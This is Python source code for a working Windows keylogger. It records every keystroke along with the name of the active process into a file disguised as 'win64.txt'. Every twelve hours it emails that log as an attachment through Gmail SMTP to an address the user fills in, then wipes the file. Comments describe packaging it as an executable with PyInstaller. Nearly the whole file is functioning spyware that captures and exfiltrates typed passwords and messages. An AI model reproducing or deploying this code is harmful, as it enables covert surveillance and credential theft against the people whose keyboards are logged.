# Imports

from pynput import keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from multiprocessing import Process, freeze_support
from time import sleep
import win32gui
import win32process
import psutil
import os, sys
import smtplib, ssl

# Global variable to help decide on whether the process has changed or not.

prev_process = ""

# Converts the relative path to an absolute path. Important for converting to an exe via PyInstaller.
# This is actually a fairly common function in most programs dealing with file paths.

def resource_path(relative_path):
    try:
        base_path = sys._MEI_PASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# All this function does is get the first three characters attributed to the current process using win32Process and win32GUI functions.

def get_current_process():

    # Python can unpack sequences. One variable is unused.
    dontcare, pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
    current_process = psutil.Process(pid).name()
    return current_process[0:3]

# This function sets the parameters for going to a new line as our keystrokes stack up OR as our process changes. 

def check_line_integrity():
    global prev_process
    cur_process = get_current_process()
    if(prev_process != cur_process):
        file = open(resource_path("win64.txt"), "a")
        file.write("\n" + cur_process + "- ")
        file.close()
        prev_process = cur_process
    file = open(resource_path("win64.txt"), "r+")
    line = ""
    for line in file:
        pass
    last_line = line
    file.close()
    if(len(last_line) > 100 or len(last_line) < 1):
        file = open(resource_path("win64.txt"), "a")
        file.write("\n" + get_current_process() + "- ")
        file.close()

# The keyboard Listener class's "on_press" function, with a custom implementation with many parameters.

def on_press(key):
    check_line_integrity()
    try:
        file = open(resource_path("win64.txt"), "a")
        file.write(key.char)
    except AttributeError:
        if(key == keyboard.Key.space):
            file = open(resource_path("win64.txt"), "a")
            file.write(" ")
        elif(key == keyboard.Key.backspace):
            file = open(resource_path("win64.txt"), "r+")
            if((file.read())[-5] != "\n"):
                file.close()
                file = open(resource_path("win64.txt"), "ab+")
                file.seek(-1, os.SEEK_CUR)
                file.truncate()
        elif(key != keyboard.Key.esc and key != keyboard.Key.shift_l):
            file = open(resource_path("win64.txt"), "a")
            file.write("<" + str(key).split('.')[1].upper() + ">")
    except TypeError:
        file = open(resource_path("win64.txt"), "a")
        file.write("<FN>")
    file.close()

# Create a new listener.

listener = keyboard.Listener(
    on_press = on_press
)

# The "clear" function accomplishes 2 things:
    # 1. After half a day, it will erase all content from the text file.
    # 2. It will take the erased content and send it over to an email of your choosing. 
        # It does this through "app passwords" in the case of gmail.

def clear():
    while(True):
        sleep(43200.0)
        f = "win64.txt"

        # Sender and receiver are same for simplicity.
        email_sender = "YOUR_EMAIL_HERE@gmail.com"
        email_receiver = "YOUR_EMAIL_HERE@gmail.com"
        password = "APP_PASSWORD_HERE"
        subject = "SUBJECT"
        body= """\
                LOREMIPSUM"""
        
        # Port 587 is chosen for TLS encryption.
        port = 587
        
        message = MIMEMultipart()
        message["From"] = email_sender
        message["To"] = email_receiver
        message["Subject"] = subject

        partTxt = MIMEText(body, "plain")
        message.attach(partTxt)

        # Attaching text file and sending.
        with open(resource_path(f), 'rb+') as attachment:
            partFile = MIMEBase("application", "octet-stream")
            partFile.set_payload(attachment.read())
            encoders.encode_base64(partFile)
            partFile.add_header("Content-Disposition", f"attachment; filename= {f}",)
            message.attach(partFile)
            text = message.as_string()
            context = ssl.create_default_context()

            # Attempt to get a connection with the email server. This can fail on three counts: no internet, bad password, bad email.
            try: 
                with smtplib.SMTP("smtp.gmail.com", port) as server:
                    server.starttls(context=context)
                    server.login(email_sender, password)
                    server.sendmail(email_sender, email_receiver, text)
                    server.quit()
            except Exception:
                print("An error has occurred. Make sure you are connected to the internet, that you are sending to a valid email, and that your password is correct.")

            # Clear.
            attachment.truncate(0)
            attachment.close()

# The main function takes care of multiprocessing...these functions will run in tandem!
# It also creates the file instantaneously to avoid any File Not Found errors.

if __name__ == '__main__':
    freeze_support()
    if not os.path.exists(resource_path("win64.txt")):
        with open(resource_path("win64.txt"), 'w'): pass
    p2 = Process(target=clear)
    p2.start()
    listener.start()
    p2.join()
    listener.join()